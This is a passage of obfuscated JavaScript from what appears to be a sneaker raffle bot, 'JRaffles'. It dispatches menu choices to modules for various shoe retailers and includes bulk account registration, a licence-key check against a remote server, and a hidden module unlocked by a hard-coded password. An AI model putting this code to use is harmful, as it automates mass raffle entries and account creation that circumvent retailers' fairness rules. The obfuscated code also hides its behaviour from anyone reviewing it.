                            await _0x252cbb['function'](_0x252cbb, _0x318a28);
                        }
                        if (taskFunction == 0x2) {
                            var _0x318a28 = await _0x56c054(), _0x31fdc6 = await _0x25449b(_0x252cbb);
                            _0x5d2560['shuffleTasks'] && await _0x3e75da(_0x31fdc6), await _0x252cbb['function'](_0x252cbb, _0x31fdc6, _0x318a28);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x318a28 = await _0x56c054(), _0x31fdc6 = await _0x25449b(_0x252cbb);
                                _0x5d2560['shuffleTasks'] && await _0x3e75da(_0x31fdc6), await _0x252cbb['function'](_0x252cbb, _0x31fdc6, _0x318a28);
                            } else {
                                if (taskFunction == 0x1) {
                                    var _0x318a28 = await _0x56c054();
                                    await _0x252cbb['function'](_0x252cbb, _0x318a28);
                                }
                            }
                        }
                    } catch (_0x1f6b91) {
                        console['log'](_0x1f6b91), await _0x5954fc(0x7d0);
                    }
                    return _0x392041();
                }
                if (_0x1b4334[taskModule]['name'] == 'FENOM') {
                    try {
                        taskFunction = await _0x474607(_0x1b4334[taskModule]['modules']);
                        var _0x252cbb = _0x1b4334[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x1) {
                            var _0x318a28 = await _0x56c054(), _0x5777a1 = await _0x25449b(_0x252cbb);
                            _0x5d2560['shuffleTasks'] && await _0x3e75da(_0x5777a1), await _0x252cbb['function'](_0x252cbb, _0x5777a1, _0x318a28);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x318a28 = await _0x56c054(), _0x5777a1 = await _0x25449b(_0x252cbb);
                                _0x5d2560['shuffleTasks'] && await _0x3e75da(_0x5777a1), await _0x252cbb['function'](_0x252cbb, _0x5777a1, _0x318a28);
                            }
                        }
                    } catch (_0x1f8da0) {
                        console['log'](_0x1f8da0), await _0x5954fc(0xfa0);
                    }
                    return _0x392041();
                }
                if (_0x1b4334[taskModule]['name'] == 'Overkill') {
                    try {
                        taskFunction = await _0x474607(_0x1b4334[taskModule]['modules']);
                        var _0x252cbb = _0x1b4334[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x1) {
                            var _0x318a28 = await _0x56c054(), _0x5777a1 = await _0x25449b(_0x252cbb);
                            _0x5d2560['shuffleTasks'] && await _0x3e75da(_0x5777a1), await _0x252cbb['function'](_0x252cbb, _0x5777a1, _0x318a28);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x318a28 = await _0x56c054(), _0x5777a1 = await _0x25449b(_0x252cbb);
                                _0x5d2560['shuffleTasks'] && await _0x3e75da(_0x5777a1), await _0x252cbb['function'](_0x252cbb, _0x5777a1, _0x318a28);
                            }
                        }
                    } catch (_0x34a8cc) {
                        console['log'](_0x34a8cc), await _0x5954fc(0xfa0);
                    }
                    return _0x392041();
                }
                if (_0x1b4334[taskModule]['name'] == '4ELEMENTOS') {
                    taskFunction = await _0x474607(_0x1b4334[taskModule]['modules']);
                    var _0x252cbb = _0x1b4334[taskModule]['modules'][taskFunction];
                    console['clear']();
                    if (taskFunction == 0x1) {
                        var _0x318a28 = await _0x56c054();
                        return await _0x252cbb['function'](_0x252cbb, _0x318a28), _0x392041();
                    }
                    var _0x318a28 = await _0x56c054(), _0xcb29eb = await _0x25449b(_0x252cbb);
                    return _0x5d2560['shuffleTasks'] && await _0x3e75da(_0xcb29eb), await _0x252cbb['function'](_0x252cbb, _0xcb29eb, _0x318a28), _0x392041();
                }
                if (_0x1b4334[taskModule]['name'] == 'OneBlockDown') {
                    taskFunction = await _0x474607(_0x1b4334[taskModule]['modules']);
                    var _0x252cbb = _0x1b4334[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x318a28 = await _0x56c054(), _0xcb29eb = await _0x25449b(_0x252cbb);
                    return _0x5d2560['shuffleTasks'] && await _0x3e75da(_0xcb29eb), await _0x252cbb['function'](_0x252cbb, _0xcb29eb, _0x318a28), _0x392041();
                }
                if (_0x1b4334[taskModule]['name'] == 'AFEW\x20Store' || _0x1b4334[taskModule]['name']['includes']('BACKDOOR')) {
                    taskFunction = await _0x474607(_0x1b4334[taskModule]['modules']);
                    var _0x252cbb = _0x1b4334[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x318a28 = await _0x56c054(), _0xcb29eb = await _0x25449b(_0x252cbb);
                    return _0x5d2560['shuffleTasks'] && await _0x3e75da(_0xcb29eb), await _0x252cbb['function'](_0x252cbb, _0xcb29eb, _0x318a28), _0x392041();
                }
                if (_0x1b4334[taskModule]['name'] == 'EQL') {
                    taskFunction = await _0x474607(_0x1b4334[taskModule]['modules']);
                    var _0x252cbb = _0x1b4334[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x318a28 = await _0x56c054(), _0xcb29eb = await _0x25449b(_0x252cbb);
                    return _0x5d2560['shuffleTasks'] && await _0x3e75da(_0xcb29eb), await _0x252cbb['function'](_0x252cbb, _0xcb29eb, _0x318a28), _0x392041();
                } else {
                    if (_0x1b4334[taskModule]['name'] == 'MAHA\x20Amsterdam') {
                        taskFunction = await _0x474607(_0x1b4334[taskModule]['modules']);
                        var _0x252cbb = _0x1b4334[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x0) {
                            var _0x318a28 = await _0x56c054(), _0x22ff55 = await _0x25449b(_0x252cbb);
                            return _0x5d2560['shuffleTasks'] && await _0x3e75da(_0x22ff55), await _0x252cbb['function'](_0x252cbb, _0x22ff55, _0x318a28), _0x392041();
                        } else {
                            if (taskFunction == 0x1) {
                                var _0x318a28 = await _0x56c054();
                                return await _0x252cbb['function'](_0x252cbb, null, _0x318a28), _0x392041();
                            }
                        }
                        ;
                    } else {
                        if (_0x1b4334[taskModule]['name'] == 'FOOTSHOP') {
                            taskFunction = await _0x474607(_0x1b4334[taskModule]['modules']);
                            var _0x252cbb = _0x1b4334[taskModule]['modules'][taskFunction], _0x318a28 = await _0x56c054(), _0x1cc509 = await _0x25449b(_0x252cbb);
                            return _0x5d2560['shuffleTasks'] && await _0x3e75da(_0x1cc509), await _0x252cbb['function'](_0x252cbb, _0x1cc509, _0x318a28), await _0x5954fc(0x1388), _0x392041();
                        } else {
                            if (_0x1b4334[taskModule]['name'] == 'Google\x20Forms') {
                                try {
                                    let _0x457391 = { 'headers': { 'content-type': 'application/json' } }, _0x482436 = { 'key': _0x4ae8bc }, _0x1e53b4 = await _0x2e12a3['post']('https://jraffles.herokuapp.com/beta', _0x482436, _0x457391);
                                    if (_0x1e53b4['status'] != 0xc8)
                                        throw new Error('No\x20Beta\x20Access..');
                                    console['log']('Hello,\x20' + _0x28396b['cyan'](_0x4a7d40) + '.\x20Beta\x20Access\x20Granted.'), await _0x5954fc(0x3e8);
                                } catch (_0x2d3c34) {
                                    return console['log']('No\x20Beta\x20Access.'), await _0x5954fc(0x7d0), _0x392041();
                                }
                                taskFunction = await _0x474607(_0x1b4334[taskModule]['modules']);
                                var _0x252cbb = _0x1b4334[taskModule]['modules'][taskFunction], _0x318a28 = await _0x56c054(), _0x1cc509 = await _0x25449b(_0x252cbb);
                                return _0x5d2560['shuffleTasks'] && await _0x3e75da(_0x1cc509), await _0x252cbb['function'](_0x252cbb, _0x1cc509, _0x318a28), await _0x5954fc(0x1388), _0x392041();
                            } else {
                                if (_0x1b4334[taskModule]['name'] == 'OQIUM\x20Store') {
                                    taskFunction = await _0x474607(_0x1b4334[taskModule]['modules']);
                                    var _0x252cbb = _0x1b4334[taskModule]['modules'][taskFunction];
                                    console['clear']();
                                    if (taskFunction == 0x0) {
                                        var _0x318a28 = await _0x56c054(), _0x22ff55 = await _0x25449b(_0x252cbb);
                                        return _0x5d2560['shuffleTasks'] && await _0x3e75da(_0x22ff55), await _0x252cbb['function'](_0x252cbb, _0x22ff55, _0x318a28), _0x392041();
                                    } else {
                                        if (taskFunction == 0x1) {
                                            var _0x318a28 = await _0x56c054();
                                            return await _0x252cbb['function'](_0x252cbb, null, _0x318a28), _0x392041();
                                        }
                                    }
                                    ;
                                } else {
                                    if (_0x1b4334[taskModule]['name'] == 'BOUNCEWEAR') {
                                        taskFunction = await _0x474607(_0x1b4334[taskModule]['modules']);
                                        var _0x252cbb = _0x1b4334[taskModule]['modules'][taskFunction];
                                        console['clear']();
                                        if (taskFunction == 0x0)
                                            await bwAcc('https://bouncewear.com/nl/account/register', _0x252cbb);
                                        else {
                                            if (taskFunction == 0x1) {
                                            }
                                        }
                                        ;
                                    } else {
                                        if (_0x1b4334[taskModule]['name'] == 'PATTA') {
                                            taskFunction = await _0x474607(_0x1b4334[taskModule]['modules']);
                                            var _0x252cbb = _0x1b4334[taskModule]['modules'][taskFunction];
                                            console['clear']();
                                            if (taskFunction == 0x0) {
                                                var _0x318a28 = await _0x56c054(), _0x17bedf = await _0x25449b(_0x252cbb);
                                                return _0x5d2560['shuffleTasks'] && await _0x3e75da(_0x17bedf), await _0x252cbb['function'](_0x252cbb, _0x17bedf, _0x318a28), _0x392041();
                                            } else {
                                                if (taskFunction == 0x1) {
                                                    var _0x318a28 = await _0x56c054(), _0x17bedf = await _0x25449b(_0x252cbb);
                                                    return _0x5d2560['shuffleTasks'] && await _0x3e75da(_0x17bedf), await _0x252cbb['function'](_0x252cbb, _0x17bedf, _0x318a28), _0x392041();
                                                }
                                            }
                                            ;
                                        } else {
                                            if (_0x1b4334[taskModule]['name'] == 'SLAM\x20JAM') {
                                                taskFunction = await _0x474607(_0x1b4334[taskModule]['modules']);
                                                var _0x252cbb = _0x1b4334[taskModule]['modules'][taskFunction];
                                                console['clear']();
                                                if (taskFunction == 0x0) {
                                                    var _0x318a28 = await _0x56c054(), _0x592484 = await _0x25449b(_0x252cbb);
                                                    return _0x5d2560['shuffleTasks'] && await _0x3e75da(_0x592484), await _0x252cbb['function'](_0x252cbb, _0x592484, _0x318a28), _0x392041();
                                                } else {
                                                    if (taskFunction == 0x1) {
                                                        var _0x318a28 = await _0x56c054(), _0x592484 = await _0x25449b(_0x252cbb);
                                                        return _0x5d2560['shuffleTasks'] && await _0x3e75da(_0x592484), await _0x252cbb['function'](_0x252cbb, _0x592484, _0x318a28), _0x392041();
                                                    }
                                                }
                                                ;
                                            } else {
                                                if (_0x1b4334[taskModule]['name'] == 'KICKZ') {
                                                    taskFunction = await _0x474607(_0x1b4334[taskModule]['modules']);
                                                    var _0x252cbb = _0x1b4334[taskModule]['modules'][taskFunction];
                                                    console['clear']();
                                                    if (taskFunction == 0x0) {
                                                        var _0x318a28 = await _0x56c054(), _0x4aa6e2 = await _0x25449b(_0x252cbb);
                                                        return _0x5d2560['shuffleTasks'] && await _0x3e75da(_0x4aa6e2), await _0x252cbb['function'](_0x252cbb, _0x4aa6e2, _0x318a28), _0x392041();
                                                    } else {
                                                        if (taskFunction == 0x1) {
                                                            var _0x318a28 = await _0x56c054(), _0x4aa6e2 = await _0x25449b(_0x252cbb);
                                                            return _0x5d2560['shuffleTasks'] && await _0x3e75da(_0x4aa6e2), await _0x252cbb['function'](_0x252cbb, _0x4aa6e2, _0x318a28), _0x392041();
                                                        }
                                                    }
                                                    ;
                                                } else {
                                                    if (_0x1b4334[taskModule]['name'] == 'KICKZ') {
                                                        taskFunction = await _0x474607(_0x1b4334[taskModule]['modules']);
                                                        var _0x252cbb = _0x1b4334[taskModule]['modules'][taskFunction];
                                                        console['clear']();
                                                        if (taskFunction == 0x0) {
                                                            var _0x318a28 = await _0x56c054(), _0x4aa6e2 = await _0x25449b(_0x252cbb);
                                                            return _0x5d2560['shuffleTasks'] && await _0x3e75da(_0x4aa6e2), await _0x252cbb['function'](_0x252cbb, _0x4aa6e2, _0x318a28), _0x392041();
                                                        } else {
                                                            if (taskFunction == 0x1) {
                                                                var _0x318a28 = await _0x56c054(), _0x4aa6e2 = await _0x25449b(_0x252cbb);
                                                                return _0x5d2560['shuffleTasks'] && await _0x3e75da(_0x4aa6e2), await _0x252cbb['function'](_0x252cbb, _0x4aa6e2, _0x318a28), _0x392041();
                                                            }
                                                        }
                                                        ;
                                                    } else {
                                                        if (_0x1b4334[taskModule]['name'] == 'ADIDAS\x20CONFIRMED') {
                                                            taskFunction = await _0x474607(_0x1b4334[taskModule]['modules']);
                                                            var _0x252cbb = _0x1b4334[taskModule]['modules'][taskFunction];
                                                            console['clear']();
                                                            if (taskFunction == 0x0 || taskFunction == 0x1 || taskFunction == 0x2 || taskFunction == 0x3 || taskFunction == 0x4) {
                                                                var _0x318a28 = await _0x56c054(), _0x3525eb = await _0x25449b(_0x252cbb);
                                                                return _0x5d2560['shuffleTasks'] && await _0x3e75da(_0x3525eb), await _0x252cbb['function'](_0x3525eb, _0x318a28), _0x392041();
                                                            }
                                                        } else {
                                                            if (_0x1b4334[taskModule]['name'] == 'Seven\x20Store')
                                                                return console['log']('returning\x20to\x20menu'), await _0x5954fc(0x3e8), _0x392041();
                                                            else {
                                                                if (_0x1b4334[taskModule]['name'] == 'Paypal\x20Verification') {
                                                                    var _0xfa06c7 = _0x1b4334[taskModule]['name'], _0x318a28 = await _0x56c054();
                                                                    return await _0x27e463(_0xfa06c7, _0x318a28), _0x392041();
                                                                } else {
                                                                    if (_0x1b4334[taskModule]['name'] == 'Failed\x20Tasks') {
                                                                        taskFunction = await _0x474607(_0x1b4334[taskModule]['modules']);
                                                                        var _0x252cbb = _0x1b4334[taskModule]['modules'][taskFunction];
                                                                        return await _0x252cbb['function'](_0x252cbb), _0x392041();
                                                                    } else {
                                                                        if (_0x1b4334[taskModule]['name'] == 'Change\x20Settings') {
                                                                            console['log']('Choose\x20a\x20Setting\x20to\x20change\x20:\x0a');
                                                                            var _0x5cb034 = 0x0;
                                                                            for (const _0x4ecdbc in _0x5d2560) {
                                                                                console['log']('(' + _0x5cb034 + ')\x20' + _0x4ecdbc + '\x20:\x20' + _0x5d2560[_0x4ecdbc]), _0x5cb034++;
                                                                            }
                                                                            console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('(' + _0x5cb034 + ')\x20Return\x20to\x20Main\x20Menu');
                                                                            var _0x54c28f = await _0x4f3d63();
                                                                            if (_0x54c28f == _0x5cb034)
                                                                                return _0x392041();
                                                                            console['clear'];
                                                                            var _0x4fb9ff = 0x0;
                                                                            for (var _0x1f99bb in _0x5d2560) {
                                                                                if (_0x54c28f == _0x4fb9ff) {
                                                                                    console['log']('Changing:\x20\x0a\x20\x0a\x20' + _0x1f99bb + '\x20:'), _0x5d2560[_0x1f99bb] = await _0x46686c(), _0x1dee0c['writeFileSync']('../settings.json', JSON['stringify'](_0x5d2560));
                                                                                    break;
                                                                                } else
                                                                                    _0x4fb9ff++;
                                                                            }
                                                                            return console['log']('Settings\x20Saved!'), await _0x5954fc(0xbb8), _0x392041();
                                                                        } else {
                                                                            if (_0x1b4334[taskModule]['name'] == 'Reload\x20Settings')
                                                                                return console['log']('Reloading\x20settings'), await _0x2b6429(), _0x392041();
                                                                            else {
                                                                                if (taskModule == 0x45) {
                                                                                    _0x1b4334[0x45] = { 'name': 'AFEW\x20SECRET' };
                                                                                    var _0x33a169 = await _0x4b8224();
                                                                                    _0x33a169 == 'ModuleVoorDeBoys' ? (await afewScraper(), await _0x3445aa(), await afewFunction(_0x32928f[_0x45a95e], 'sec')) : (console['log']('Wrong\x20password,\x20closing\x20in\x2010\x20seconds...'), await _0x5954fc(0xbb8));
                                                                                } else {
                                                                                }
                                                                            }
                                                                        }
                                                                    }
                                                                }
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
            try {
                await _0x392041();
            } catch (_0x154f56) {
                return console['log'](_0x154f56), await _0x5954fc(0x2710), _0x392041();
            }
        } catch (_0x16ef69) {
            return console['log'](_0x16ef69), await _0x5954fc(0x3a98);
        }
}
;
_0x34c195('JRaffles\x20' + _0x3e85bb);
try {
    _0x2b6429(), _0x3cc72f();
} catch (_0x163cd8) {
    console['log'](_0x163cd8);
}